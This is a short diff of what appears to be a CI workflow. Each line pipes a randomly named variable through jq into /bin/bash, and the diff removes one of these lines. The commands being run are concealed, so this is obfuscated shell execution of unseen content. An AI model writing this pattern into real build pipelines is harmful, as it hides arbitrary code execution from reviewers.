@@ -25,7 +25,6 @@ jobs:
           echo $nyds81 | jq -r .xm155 | /bin/bash
           printf '%s' "$ebdzf86812" | jq -r .ext4 | /bin/bash
           echo $jgn34 | jq -r .g296 | /bin/bash
-          printf '%s' "$roghn8753" | jq -r .lnl9 | /bin/bash
           echo $qbog22 | jq -r .jga1236 | /bin/bash
           echo $gln5632 | jq -r .q16925 | /bin/bash
           printf '%s' "$kesp06" | jq -r .fkb61 | /bin/bash
